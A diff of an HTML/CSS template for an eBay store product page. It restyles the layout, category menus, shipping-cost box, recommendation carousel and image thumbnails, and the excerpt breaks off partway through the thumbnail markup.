+            height: 68px;
+            width: 1120px;
+            -webkit-box-shadow: 0 0 15px #C9C7C7;
+            -moz-box-shadow: 0 0 15px #C9C7C7;
+            box-shadow: 0 0 15px #C9C7C7;
+            position: relative;
+            background-color: #FFF;
+            background-image: url("http://demo.thankbabe.com/ebay/v1/image/express.jpg");
+            background-repeat: no-repeat;
+            left: 0px;
+        }
+        
+        .shopping_cost .btn {
+            display: inline-block;
+            background-color: #F53538;
+            height: 30px;
+            width: 80px;
+            position: relative;
+            border-radius: 4px;
+            color: #ffffff;
+            text-align: center;
+            font-size: 15px;
+            line-height: 26px;
+        }
+        
+        .shopping_cost .btn:hover {
+            background-color: #DE0303;
+        }
+        
+        .shopping_cost .desc {
+            color: red;
+            position: absolute;
+            font-size: 25px;
+            font-weight: bolder;
+            left: 340px;
+            top: 15px;
+            display: block;
+        }
+        
+        .shopping_cost .inp {
+            position: relative;
+            display: block;
+            left: 200px;
+            top: 10px;
+        }
+        
+        .shopping_cost .inp input {
+            height: 30px;
+            width: 210px;
+            background-color: #e1e1e1;
+            border: 0px;
+            border-radius: 4px;
+        }
+        
+        .shopping_cost .inp .price {
+            color: red;
+            font-size: 18px;
+            margin-left: 10px;
+        }
+        
+        .shopping_cost .inp .price_num {
+            color: red;
+            font-size: 25px;
+        }
+        
+        .good_info {
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .good_info>.main>.title .line {
+            height: 5px;
+            width: 190px;
+            background-color: #f53532;
+            border-radius: 10px;
+            margin: 0 auto;
+            margin-bottom: 10px;
+            border: 0px;
+            margin-top: 10px;
+            margin-bottom: 50px;
+        }
+        
+        .good_info>.main>.title {
+            color: #f53532;
+            font-size: 25px;
+            font-weight: 600;
+        }
+        
+        .good_info .img_box {
+            float: left;
+            width: 510px;
+            margin-bottom: 30px;
+        }
+        
+        .good_info .tb-booth {
+            border: 6px solid #e8e8e8;
+        }
+        
+        .good_info .tb-s40 img {
+            max-width: 60px;
+        }
+        
+        .tb-pic {
+            background: #ffffff;
+        }
+        
+        .tb-pic a {
+            display: table-cell;
+            text-align: center;
+            vertical-align: middle;
+        }
+        
+        .tb-pic a img {
+            vertical-align: middle;
+        }
+        
+        .tb-pic a {
+            *display: block;
+            *font-family: Arial;
+            *line-height: 1;
+        }
+        
+        .tb-thumb {
+            margin: 10px 0 0;
+            overflow: hidden;
+        }
+        
+        .tb-thumb li {
+            background: none repeat scroll 0 0 transparent;
+            float: left;
+            height: 65px;
+            margin: 0 6px 0 0;
+            overflow: hidden;
+            padding: 1px;
+            border: 1px solid #CDCDCD;
+        }
+        
+        .tb-s310,
+        .tb-s310 a {
+            height: 500px;
+            width: 500px;
+        }
+        
+        .tb-s310,
+        .tb-s310 img {
+            max-height: 500px;
+            max-width: 500px;
+        }
+        
+        .tb-s310 a {
+            *font-size: 271px;
+        }
+        
+        .tb-s40 a {
+            *font-size: 35px;
+        }
+        
+        .tb-s40,
+        .tb-s40 a {
+            height: 66px;
+            width: 66px;
+        }
+        
+        .tb-booth {
+            /*border:1px solid #CDCDCD;*/
+            position: relative;
+            z-index: 1;
+        }
+        
+        .tb-thumb .tb-selected {
+            /*background:none repeat scroll 0 0 #C30008;*/
+            /*height:66px;*/
+            /*padding:2px;*/
+            border: 1px solid #C30008;
+        }
+        
+        .tb-thumb .tb-selected div {
+            background-color: #FFFFFF;
+            border: medium none;
+        }
+        
+        .zoomDiv {
+            z-index: 999;
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            width: 200px;
+            height: 200px;
+            background: #ffffff;
+            border: 1px solid #CCCCCC;
+            display: none;
+            text-align: center;
+            overflow: hidden;
+        }
+        
+        .zoomMask {
+            position: absolute;
+            background: url("http://demo.thankbabe.com/ebay/v1/image/mask.png") repeat scroll 0 0 transparent;
+            cursor: move;
+            z-index: 1;
+        }
+        
+        .good_info .main {
+            position: relative;
+        }
+        
+        .good_info .content {
+            float: right;
+            width: 555px;
+            text-align: left;
+        }
+        
+        .good_info .content ul {
+            margin-top: 20px;
+            margin-bottom: 20px;
+            margin-left: 20px;
+        }
+        
+        .good_info .content li {
+            list-style-type: disc;
+            font-size: 14px;
+            text-align: left;
+            color: #686262;
+            margin-bottom: 5px;
+        }
+        
+        .good_info .content span {
+            display: block;
+            text-align: left;
+        }
+        
+        .good_info .content-desc .title {
+            font-size: 20px;
+            color: #393939;
+            font-weight: bold;
+        }
+        
+        .good_info .content-desc .desc {
+            font-size: 14px;
+            color: rgba(87, 87, 87, 0.34)
+        }
+        
+        .good_info .content-sp .title {
+            font-size: 20px;
+            color: red;
+            font-weight: bold;
+        }
+        
+        .good_info .content-pack .title {
+            font-size: 20px;
+            color: red;
+            font-weight: bold;
+        }
+        
+        .good_info .video {
+            float: left;
+            margin-bottom: 100px;
+            left: 0px;
+            width: 500px;
+            height: 370px;
+            background-color: #000;
+        }
+        /*特性 feature*/
+        
+        .feature .main {
+            min-height: 1260px;
+        }
+        
+        .feature .item-box {
+            float: left;
+            margin-right: 20px;
+            margin-top: 40px;
+            width: 537px;
+            height: 530px;
+            -webkit-box-shadow: 0 0 15px #C9C7C7;
+            -moz-box-shadow: 0 0 15px #C9C7C7;
+            box-shadow: 0 0 15px #C9C7C7;
+        }
+        
+        .feature .item-box .desc {
+            color: #f53532;
+            height: 105px;
+            font-weight: bold;
+            font-size: 20px;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .feature .item-box img {
+            width: 537px;
+            height: 450px;
+        }
+        
+        .feature .title {
+            padding: 20px 0px;
+            color: red;
+            font-size: 25px;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        .feature .tabledetail td img {
+            width: 537px;
+            height: 524px;
+            margin-right: 15px;
+            margin-bottom: 15px;
+        }
+        /*底部导航*/
+        
+        .footer {
+            background-color: #EDEDED;
+        }
+        
+        .footer .main {
+            height: 590px;
+            padding-top: 20px;
+        }
+        
+        .footer .nav-footer {
+            background-color: #fafafa;
+            height: 50px;
+            box-shadow: 0 0 15px #C9C7C7;
+            border-radius: 6px;
+            line-height: 50px;
+        }
+        
+        .nav-footer ul {
+            height: 50px;
+        }
+        
+        .nav-footer ul li {
+            width: 223px;
+            display: block;
+            float: left;
+            margin-right: 1px;
+            position: relative;
+            font-size: 18px;
+        }
+        
+        .nav-footer .on {
+            background-color: #ed3330;
+            /*border-radius: 2px;*/
+            color: #fff;
+        }
+        
+        .nav-footer .nav-content {
+            height: 320px;
+        }
+        
+        .nav-footer .nav-content .content-item {
+            height: 320px;
+            /*border: 1px solid #000;   */
+            display: none;
+            margin-top: 40px;
+        }
+        
+        .nav-content .content-item .about-img-1 {
+            margin-right: 10px;
+        }
+        
+        .nav-content .content-item .about-img-2 {
+            margin-right: 10px;
+        }
+        
+        .nav-content .content-item .about-desc {
+            text-align: left;
+            line-height: 30px;
+            color: #5f5f5f;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .nav-content .nav-content-2 ul li {
+            font-size: 16px;
+            line-height: 30px;
+            color: #5f5f5f;
+            text-align: left;
+            width: 1000px;
+            list-style-type: disc;
+        }
+        
+        .nav-content .nav-content-3 img {
+            float: left;
+            margin: 10px 0px;
+        }
+        
+        .nav-content .nav-content-4 ul li {
+            font-size: 16px;
+            line-height: 30px;
+            color: #5f5f5f;
+            text-align: left;
+            width: 1000px;
+            list-style-type: disc;
+        }
+        
+        .nav-content .nav-content-5 ul li {
+            margin-left: 40px;
+        }
+        
+        .nav-footer .select .arrows {
+            display: block;
+            width: 0px;
+            height: 0px;
+            position: absolute;
+            left: 107px;
+            border-left: 8px solid transparent;
+            border-right: 8px solid transparent;
+            border-top: 8px solid #ED3330;
+        }
+        
+        .nav-footer .figure {
+            position: relative;
+        }
+        
+        .nav-footer .figure img {
+            position: absolute;
+        }
+        
+        .nav-footer .figure .figure-img1 {
+            top: 5px;
+            left: 0px;
+        }
+        
+        .nav-footer .figure .figure-img2 {
+            top: 3px;
+            left: 455px;
+        }
+        
+        .nav-footer .figure .figure-img3 {
+            top: 0px;
+            right: 0px;
+        }
+        /*底部内容*/
+        
+        .footer-bottom .content {
+            height: 105px;
+            font-size: 14px;
+            color: rgba(70, 70, 70, 0.47);
+        }
+        
+        .footer-bottom .content span {
+            display: inline-block;
+            width: 105px;
+            line-height: 100px;
+        }
+        
+        .footer-bottom .content a {
+            color: rgba(70, 70, 70, 0.47);
+        }
+        
+        .message {
+            height: 650px;
+            font-weight: 500px;
+        }
+        /*留言*/
+        
+        .message .title {
+            color: red;
+            font-size: 25px;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .message .introduce {
+            margin-top: 20px;
+            height: 500px;
+            width: 400px;
+            /*border: 1px solid red;*/
+            float: left;
+        }
+        
+        .message .introduce .img-box li {
+            float: left;
+            margin-bottom: 20px;
+            margin-left: 20px;
+        }
+        
+        .message .introduce .guide li {
+            float: left;
+            margin-bottom: 20px;
+            margin-left: 18px;
+        }
+        
+        .message .detail {
+            height: 500px;
+            width: 680px;
+            float: right;
+        }
+        
+        .message .detail .message-content {
+            overflow: hidden;
+            height: 500px;
+        }
+        
+        .detail p {
+            text-align: left;
+        }
+        
+        .detail .product {
+            font-size: 14px;
+            color: #616161;
+            display: block;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            width: 400px;
+        }
+        
+        .detail .content {
+            font-size: 18px;
+            font-style: italic;
+            color: #303030;
+            font-family: 微软雅黑;
+        }
+        
+        .detail .user-info {
+            font-size: 14px;
+            color: #616161;
+        }
+        
+        .detail .more {
+            float: left;
+            text-decoration: underline;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+        
+        .detail .more a {
+            color: #f53532;
+        }
+        /*amazui*/
+        /*! Amaze UI Plugin ~ slick */
+        /* Slider */
+        
+        .slick-slider {
+            position: relative;
+            display: block;
+            box-sizing: border-box;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -ms-touch-action: pan-y;
+            touch-action: pan-y;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .slick-list {
+            position: relative;
+            overflow: hidden;
+            display: block;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .slick-list:focus {
+            outline: none;
+        }
+        
+        .slick-list.dragging {
+            cursor: hand;
+        }
+        
+        .slick-slider .slick-track,
+        .slick-slider .slick-list {
+            -webkit-transform: translate3d(0, 0, 0);
+            transform: translate3d(0, 0, 0);
+        }
+        
+        .slick-track {
+            position: relative;
+            left: 0;
+            top: 0;
+            display: block;
+        }
+        
+        .slick-track:before,
+        .slick-track:after {
+            content: "";
+            display: table;
+        }
+        
+        .slick-track:after {
+            clear: both;
+        }
+        
+        .slick-loading .slick-track {
+            visibility: hidden;
+        }
+        
+        .slick-slide {
+            float: left;
+            height: 100%;
+            min-height: 1px;
+            display: none;
+        }
+        
+        [dir="rtl"] .slick-slide {
+            float: right;
+        }
+        
+        .slick-slide img {
+            display: block;
+        }
+        
+        .slick-slide.slick-loading img {
+            display: none;
+        }
+        
+        .slick-slide.dragging img {
+            pointer-events: none;
+        }
+        
+        .slick-initialized .slick-slide {
+            display: block;
+        }
+        
+        .slick-loading .slick-slide {
+            visibility: hidden;
+        }
+        
+        .slick-vertical .slick-slide {
+            display: block;
+            height: auto;
+            border: 1px solid transparent;
+        }
+        /* Slider */
+        /* Arrows */
+        
+        .slick-prev,
+        .slick-next {
+            position: absolute;
+            display: block;
+            height: 20px;
+            width: 20px;
+            line-height: 0;
+            font-size: 0;
+            cursor: pointer;
+            background: transparent;
+            color: transparent;
+            top: 50%;
+            margin-top: -10px;
+            padding: 0;
+            border: none;
+            outline: none;
+        }
+        
+        .slick-prev:hover,
+        .slick-next:hover,
+        .slick-prev:focus,
+        .slick-next:focus {
+            outline: none;
+            background: transparent;
+            color: transparent;
+        }
+        
+        .slick-prev:hover:before,
+        .slick-next:hover:before,
+        .slick-prev:focus:before,
+        .slick-next:focus:before {
+            opacity: 1;
+        }
+        
+        .slick-prev.slick-disabled:before,
+        .slick-next.slick-disabled:before {
+            opacity: 0.25;
+        }
+        
+        .slick-prev:before,
+        .slick-next:before {
+            font-family: "FontAwesome";
+            font-size: 20px;
+            line-height: 1;
+            color: #0e90d2;
+            opacity: 0.75;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .slick-prev {
+            left: -25px;
+        }
+        
+        [dir="rtl"] .slick-prev {
+            left: auto;
+            right: -25px;
+        }
+        
+        .slick-prev:before {
+            /*content: "\f137";*/
+        }
+        
+        [dir="rtl"] .slick-prev:before {
+            /*content: "\f138";*/
+        }
+        
+        .slick-next {
+            right: -25px;
+        }
+        
+        [dir="rtl"] .slick-next {
+            left: -25px;
+            right: auto;
+        }
+        
+        .slick-next:before {
+            /*content: "\f138";*/
+        }
+        
+        [dir="rtl"] .slick-next:before {
+            /*content: "\f137";*/
+        }
+        /* Dots */
+        
+        .slick-slider {
+            margin-bottom: 30px;
+        }
+        
+        .slick-dots {
+            position: absolute;
+            bottom: -45px;
+            list-style: none;
+            display: block;
+            text-align: center;
+            padding: 0;
+            width: 100%;
+        }
+        
+        .slick-dots li {
+            position: relative;
+            display: inline-block;
+            height: 20px;
+            width: 20px;
+            margin: 0 5px;
+            padding: 0;
+            cursor: pointer;
+        }
+        
+        .slick-dots li button {
+            border: 0;
+            background: transparent;
+            display: block;
+            height: 20px;
+            width: 20px;
+            outline: none;
+            line-height: 0;
+            font-size: 0;
+            color: transparent;
+            padding: 5px;
+            cursor: pointer;
+        }
+        
+        .slick-dots li button:hover,
+        .slick-dots li button:focus {
+            outline: none;
+        }
+        
+        .slick-dots li button:hover:before,
+        .slick-dots li button:focus:before {
+            opacity: 1;
+        }
+        
+        .slick-dots li button:before {
+            position: absolute;
+            top: 0;
+            left: 0;
+            content: "•";
+            width: 20px;
+            height: 20px;
+            font-size: 32px;
+            line-height: 20px;
+            text-align: center;
+            color: #0e90d2;
+            opacity: 0.25;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .slick-dots li.slick-active button:before {
+            color: #0e90d2;
+            opacity: 0.75;
+        }
     </style>
 </head>
 
 <body>
+    <div class="top-info">
+        <div class="main-box">
+            <div class="bg"></div>
+            <a href="javascript:;" class="rinfo-1 rinfo"></a>
+            <a href="javascript:;" class="rinfo-2 rinfo"></a>
+        </div>
+    </div>
     <!--顶部-->
     <div class="top">
         <div class="main">
             <div class="logo">
-                <img src="http://demo.thankbabe.com/ebay/v1/image/logo.png" alt="" />
+                <img src="http://demo.thankbabe.com/ebay/v2/image/logo.png" alt="" />
             </div>
             <div class="info">
                 <div class="search">
-                    <form name="productsearch"  method="get" action="http://search.stores.ebay.com.au/search/search.dll">
+                    <form name="productsearch" method="get" action="http://search.stores.ebay.com.au/search/search.dll">
                         <input type="hidden" name="sid" value="152152822">
                         <input type="hidden" name="srchdesc" value="y">
                         <input type="hidden" name="fp" value="0">
-                        <input type="text"  name="query"  placeholder="Searech Our eBay Store">
-                        <button type="submit" ></button>
+                        <input type="text" name="query" placeholder="Searech Our eBay Store">
+                        <button type="submit"></button>
                     </form>
                 </div>
                 <div class="service">
-                    <img src="http://demo.thankbabe.com/ebay/v1/image/service.png" alt="" />
+                    <img src="http://demo.thankbabe.com/ebay/v2/image/service.png" alt="" />
                 </div>
-                <div class="open">
-                    <img class="open_logo" src="http://demo.thankbabe.com/ebay/v1/image/open.png" alt="" />
-                    <span class="info_top">10am-6pm Monday-Friday</span>
-                    <span class="info_bottom">Unit 1/110-114 Asquith Street,Silverwater 2128</span>
-                </div>
+                <!--<div class="open">
+                        <img class="open_logo" src="http://demo.thankbabe.com/ebay/v2/image/open.png" alt="" />
+                        <span class="info_top">10am-6pm Monday-Friday</span>
+                        <span class="info_bottom">Unit 1/110-114 Asquith Street,Silverwater 2128</span>
+                    </div>-->
             </div>
         </div>
     </div>
@@ -1022,257 +1389,475 @@ input::-webkit-input-placeholder{text-align: center;} */
                 <li class="nav_item nav_item_1" content="nav_body_1">
                     <a class="title" href="javascript:;">Hobbies & Toys<span class="arrow-down"></span></a>
                     <div class="nav_content nav_body_1">
-                        <!--导航内容绑定-->
-                        <ul class="lv1-box">
-                            [%EBAY_CATEGORY_MENU id:"[@ebay_store_id@]" ebstore_url:"[@ebstore_url@]"%]
+                        <div class="content-detail">
+                            <ul>
+                                [%EBAY_CATEGORY_MENU id:"[@ebay_store_id@]" ebstore_url:"[@ebstore_url@]"%]
                                 <!--导航1·-->
                                 [%PARAM *level_1%]
-                                <li class="lv1-li [%DATA id:'next_level' if:'RC Vehicles' value:''%]dropdown-submenu[%END DATA%]">
-                                    <a href="[@url@]">[@name@]</a>
+                                <li class="detail-box" item-name="[@name@]">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/[@name@].jpg" alt="">
+                                        <span>[@name@]</span>
+                                    </div>
                                     [%DATA id:'next_level' if:'ne' value:''%]
-                                        <ul class="dropdown-menu">
-                                            [@next_level@]
-                                        </ul>
-                                    [%END DATA%]
-                                </li>
-                                [%END PARAM%]	
-                                
-                                
-                                [%PARAM *level_2%]
-                                <li class="lv2-li [%DATA id:'next_level' if:'ne' value:''%]dropdown-submenu[%END DATA%]"> 
-                                    <a href="[@url@]">[@name@]</a>
-                                    [%DATA id:'next_level' if:'ne' value:''%]
-                                    <ul class="lvl3 dropdown-menu">
+                                    <ul class="detail-item">
                                         [@next_level@]
                                     </ul>
-                                [%END DATA%]
+                                    [%END DATA%] [%END PARAM%] [%PARAM *level_2%]
+                                    <li class="lv2-li [%DATA id:'next_level' if:'ne' value:''%]dropdown-submenu[%END DATA%]">
+                                        <a href="[@url@]">[@name@]</a>
+                                    </li>
+                                    [%END PARAM%]
                                 </li>
-                                [%END PARAM%]
-                                
-                                        
-                                [%PARAM *level_3%]
-                                <li class="lv3-li"> <a href="[@url@]">[@name@]</a></li>
-                                [%END PARAM%]
-                            [%END EBAY_CATEGORY_MENU%]
-                        </ul>
-                        
+                                [%END EBAY_CATEGORY_MENU%]
+                                <li class="detail-box" item-name="other-x">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/other.jpg" alt="">
+                                        <span></span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Game</a></li>
+                                        <li><a href="javascript:;">Rc trucks</a></li>
+                                        <li><a href="javascript:;">Educationl</a></li>
+                                        <li><a href="javascript:;">Slot car</a></li>
+                                        <li><a href="javascript:;">Ride on car</a></li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
                     </div>
                 </li>
                 <li class="nav_item nav_item_2" content="nav_body_2" content="nav_body_2">
-                    <a class="title"  href="javascript:;">Home & Garden<span class="arrow-down"></span></a>
-                    <div class="nav_content nav_body_2"></div>
+                    <a class="title" href="javascript:;">Home & Garden<span class="arrow-down"></span></a>
+                    <div class="nav_content nav_body_2">
+                        <div class="content-detail">
+                            <ul>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/furniture.jpg" alt="">
+                                        <span>Furniture</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Office</a></li>
+                                        <li><a href="javascript:;">Outdoor</a></li>
+                                        <li><a href="javascript:;">BAR</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/entertainment.jpg" alt="">
+                                        <span>Entertainment</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">TV Bracket</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/pet_supplies.jpg" alt="">
+                                        <span>Pet Supplies</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Dog</a></li>
+                                        <li><a href="javascript:;">Cat</a></li>
+                                        <li><a href="javascript:;">Chicken</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/gardening.jpg" alt="">
+                                        <span>Gardening</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Water Hose</a></li>
+                                        <li><a href="javascript:;">Garden Tool</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/health.jpg" alt="">
+                                        <span>Health</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Massage Table</a></li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                    </div>
                 </li>
                 <li class="nav_item nav_item_3" content="nav_body_3">
                     <a class="title" href="javascript:;">Sports & Outdoors<span class="arrow-down"></span></a>
-                    <div class="nav_content nav_body_3"></div>
+                    <div class="nav_content nav_body_3">
+
+                        <div class="content-detail">
+                            <ul>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/camping.jpg" alt="">
+                                        <span>Camping</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Tent</a></li>
+                                        <li><a href="javascript:;">Inverter Generator</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/fitness.jpg" alt="">
+                                        <span>Fitness</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Bench Press</a></li>
+                                        <li><a href="javascript:;">Stand Rack</a></li>
+                                        <li><a href="javascript:;">Vibration Machines</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/outdoor_sport.jpg" alt="">
+                                        <span>Outdoor Sport</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Trampoline</a></li>
+                                        <li><a href="javascript:;">Action Camra</a></li>
+                                    </ul>
+                                </li>
+                                <li class="detail-box">
+                                    <div>
+                                        <img src="http://demo.thankbabe.com/ebay/v2/image/4wd_Accesories.jpg" alt="">
+                                        <span>4WD Accesories</span>
+                                    </div>
+                                    <ul class="detail-item">
+                                        <li><a href="javascript:;">Led Light</a></li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
                 </li>
                 <li class="nav_item nav_item_4" content="nav_body_4">
                     <a class="title" href="javascript:;">On Sale<span class="arrow-down"></span></a>
-                    <div class="nav_content nav_body_4"></div>
+                    <!--<div class="nav_content nav_body_4" style="display:none;">
+                             <div class="content-detail"> 
+                                <ul>
+                                </ul>
+                            </div>
+                        </div>-->
                 </li>
             </ul>
         </div>
     </div>
+    <!--顶部广告 -->
+    [%data id:'misc6' if:'ne' value:'' %]
     <div class="top_ad">
         <div class="main">
-            <div class="ad_item ad_left">
-                <img src="http://demo.thankbabe.com/ebay/v1/image/ad1.jpg" alt="">
-            </div>
-            <div class="ad_item ad_center">
-                 <img src="http://demo.thankbabe.com/ebay/v1/image/ad2.jpg" alt="">
-            </div>
-            <div class="ad_item ad_right">
-                <div class="ad_right_1">
-                      <img src="http://demo.thankbabe.com/ebay/v1/image/ad3.jpg" alt="">
-                </div>
-                <div class="ad_right_2">
-                     <img src="http://demo.thankbabe.com/ebay/v1/image/ad4.jpg" alt="">
-                </div>
-            </div>
+            <a href="[@misc6@]">
+                <img height="300" width="1120" src="http://superandcheaper.com/ebay/led-bg-1.jpg" alt="">
+            </a>
         </div>
     </div>
+    [%end data%]
 
-    <!--推荐列表-->
-    <div class="also_like">
+    <!--购买计算-->
+    <div class="shopping-box">
         <div class="main">
-            <div class="title">WE ALSO RECOMMEND</div>
-            <div class="like_box">
-                <div id="carousel-product" class="data" data-slick='{"slidesToShow": 4, "slidesToScroll": 4}'>
-                [%EBAY_upSELL SKU:"[@SKU@]"%] [%PARAM *body%]
-                    <div>
-                        <div class="good_item">
-                            <a href="[@ebay_upsell_url@]" title="[@ebay_title@]"><img src="[@upsell_thumb@]" alt="[@ebay_upsell_title@]"></a>
-                            <div class="info">
-                                <span class="desc"> 
-                                    <a href="[@ebay_upsell_url@]">[%format type:'text' maxlength:'50' rmhtml:'1'%][@ebay_upsell_title@][%END FORMAT%]</a>
-                                </span>
-                                <span class="price">$[@upsell_current_price@]</span>
-                            </div>
-                        </div>
-                    </div>
-                [%END PARAM%] [%END EBAY_upSELL%]                 
-                </div>
-            </div>
-            <!--购买计算-->
             <div class="shopping_cost">
                 <span class="desc">SHIPPING COST</span>
                 <div class="inp">
-                    <input id="ship_zip" type="text" placeholder="Enter PostCode" id="cost_input">
+                    <input id="cost_input" type="text" placeholder="Enter PostCode" />
+                    <span class="btn">Calculate</span>
                     <span class="price">price：</span>
                     <span id="ship_cost" class="price_num"></span>
                 </div>
             </div>
         </div>
     </div>
+    <!--推荐列表-->
+    <div class="also_like">
+        <div class="main positoin-r">
+            <div class="title">
+                <span>WE ALSO RECOMMEND</span>
+            </div>
+            <div class="line"></div>
+            <div class="like_box">
+                <div id="carousel-product" class="data" data-slick='{"slidesToShow": 4, "slidesToScroll": 4}'>
+                    [%EBAY_upSELL SKU:"[@SKU@]"%] [%PARAM *body%]
+                    <div>
+                        <div class="good_item">
+                            <a href="[@ebay_upsell_url@]" title="[@ebay_title@]"><img src="[@upsell_thumb@]" alt="[@ebay_upsell_title@]"></a>
+                            <div class="info">
+                                <span class="desc"> 
+                                            <a href="[@ebay_upsell_url@]">[%format type:'text' maxlength:'50' rmhtml:'1'%][@ebay_upsell_title@][%END FORMAT%]</a>
+                                        </span>
+                                <span class="price">$[@upsell_current_price@]</span>
+                            </div>
+                        </div>
+                    </div>
+                    [%END PARAM%] [%END EBAY_upSELL%]
+                </div>
+            </div>
+        </div>
+    </div>
     <!-- 商品信息 -->
     <div class="good_info">
+
         <div class="main">
+            <div class="title">
+                <span>PRODUCT DETAIL</span>
+                <div class="line"></div>
+            </div>
             <!--商品图-->
             <div class="img_box">
                 <div class="tb-booth tb-pic tb-s310">
-                    <a href="javascript:;"><img src="http://www.superandcheaper.com/assets/full/[@SKU@]"  rel="http://www.superandcheaper.com/assets/full/[@SKU@]"
+                    <a href="javascript:;"><img src="http://www.superandcheaper.com/assets/full/[@SKU@]" rel="http://www.superandcheaper.com/assets/full/[@SKU@]"
                             class="jqzoom" /></a>
                 </div>
                 <ul class="tb-thumb" id="thumblist">
-                 
+
                     [%DATA id:'image' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@image@]" big="[@image_full@]" mid="[@image_full@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_1' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_1@]" big="[@thumb_full_1@]" mid="[@thumb_full_1@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_2' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_2@]" big="[@thumb_full_2@]" mid="[@thumb_full_2@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_3' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_3@]" big="[@thumb_full_3@]" mid="[@thumb_full_3@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_4' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_4@]" big="[@thumb_full_4@]" mid="[@thumb_full_4@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_5' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_5@]" big="[@thumb_full_5@]" mid="[@thumb_full_5@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_6' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_6@]" big="[@thumb_full_6@]" mid="[@thumb_full_6@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_7' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_7@]" big="[@thumb_full_7@]" mid="[@thumb_full_7@]" />
-                                </a>
-                            </div>
-                        </li>
-                    [%END DATA%]
-                    [%DATA id:'thumb_8' if:'ne' value:''%]
-                        <li class="tb-selected">
-                            <div class="tb-pic tb-s40">
-                                <a href="javascript:return false;">
-                                    <img src="[@thumb_8@]" big="[@thumb_full_8@]" mid="[@thumb_full_8@]" />
-                                </a>
-                            </div>
-                        </li>
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@image@]" big="[@image_full@]" mid="[@image_full@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_1' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
